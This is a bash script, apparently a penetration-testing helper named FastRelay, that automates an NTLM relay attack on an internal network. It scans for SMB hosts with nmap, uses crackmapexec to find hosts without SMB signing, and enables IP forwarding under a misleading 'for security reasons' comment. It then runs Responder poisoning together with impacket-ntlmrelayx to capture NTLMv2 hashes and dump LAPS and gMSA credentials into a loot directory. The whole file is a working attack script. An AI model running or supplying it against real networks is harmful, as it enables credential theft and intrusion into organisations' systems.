#!/bin/bash

figlet FastRelay

if [ ! -s /root/input/ipint.txt ]; then
  echo '! > ipint.txt missing in /root/input/ipint.txt.'
  exit 1
fi

if [ ! -s /root/output/list/ipup.txt ]; then
  {
    echo 'Start nmap PE for Relay'
    date
  } >>/root/output/runtime.txt
  nmap -PE -sn -n --max-retries 2 --max-hostgroup 20 --scan-delay 1 -oA /root/output/nmap/pe -iL /root/input/ipint.txt >/dev/null 2>&1
  awk '/Up/ {print$2}' /root/output/nmap/pe.gnmap >/root/output/list/ipup.txt
  {
    echo 'END nmap PE for Relay'
    date
  } >>/root/output/runtime.txt
fi

if [ ! -f /root/output/list/smb_open.txt ]; then
  {
    echo 'Start nmap smb_open for Relay'
    date
  } >>/root/output/runtime.txt
  nmap -p 445 --max-retries 2 --max-hostgroup 20 --scan-delay 1 -oA /root/output/nmap/445 -iL /root/output/list/ipup.txt >/dev/null 2>&1
  awk '/open/ {print$2}' /root/output/nmap/445.gnmap >/root/output/list/smb_open.txt
  {
    echo 'END nmap smb_open for Relay'
    date
  } >>/root/output/runtime.txt
fi

if [ ! -s /root/output/list/smb_open.txt ]; then
  echo '! > no smb HOSTS!'
  exit 1
fi

if [ ! -f /root/output/list/smb_sign_off.txt ]; then
  {
    echo 'Start CME gen-relay-list for Relay'
    date
  } >>/root/output/runtime.txt
  crackmapexec smb /root/output/list/smb_open.txt --gen-relay-list /root/output/list/smb_sign_off.txt >/root/output/cme_beauty.txt
  {
    echo 'END CME gen-relay-list for Relay'
    date
  } >>/root/output/runtime.txt
fi

if [ ! -s /root/output/list/smb_sign_off.txt ]; then
  echo '! > No no-signing HOSTS!'
  exit 1
fi

# Packet forwarding for security reasons
sysctl -w net.ipv4.ip_forward=1
sysctl -w net.ipv6.conf.all.forwarding=1

{
  echo 'Start Responder Relay'
  date
} >>/root/output/runtime.txt

#Responder with 300sec timeout in bg
#Python unbuffered for logging to file
export PYTHONUNBUFFERED=TRUE

timeout 300 impacket-ntlmrelayx -6 -ts -ra --dump-laps --dump-gmsa -l /root/output/loot -of /root/output/loot/ntlm_relay_ntlmv2.txt -smb2support -tf /root/output/list/smb_sign_off.txt &>/root/output/relay.txt &
sleep 5
timeout 300 responder -I eth0 -wvFP &>/root/output/responder.txt &

wait "$(pgrep -f ntlmrelayx.py)"
wait "$(pgrep -f Responder.py)"

#Python unbuffered reset to default
unset PYTHONUNBUFFERED

{
  echo 'END Responder Relay'
  date
} >>/root/output/runtime.txt

if [ ! -s /root/output/loot/ntlm_relay_ntlmv2.txt ]; then
  echo '! >> No Hashes Found'
fi
